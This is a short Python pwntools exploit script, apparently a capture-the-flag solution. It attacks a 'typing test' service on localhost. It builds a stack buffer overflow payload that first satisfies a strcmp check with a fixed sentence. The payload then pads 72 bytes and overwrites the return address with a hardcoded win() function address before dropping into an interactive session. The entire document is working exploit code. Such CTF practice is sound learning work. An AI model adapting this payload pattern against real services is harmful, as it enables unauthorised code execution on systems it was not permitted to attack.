from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

# Connection
p = remote('localhost', 1067)  # or process('./chall') for local testing (see below)
# p = process('./challenge') or this line for local testing

# Win function address
win_addr = 0x40128a# Offset to return address

offset = 72  # 64 (buffer) + 8 (saved RBP)

# The exact typing text required
TYPING_TEXT = b"LeBron James is the greatest basketball player of all time."

# Build payload
payload = TYPING_TEXT           # Pass the strcmp() check
payload += b'\x00'              # Null terminate the string
payload += b'A' * (offset - len(payload))  # Pad to return address
payload += p64(win_addr)        # Overwrite return address with win()

# Interact with the service
p.recvuntil(b'Press ENTER to start...')
p.sendline(b'')              # Start the typing test
p.recvuntil(b'> ')           # Wait for input prompt
p.sendline(payload)          # Send our malicious payload

# Get the flag!
p.interactive()
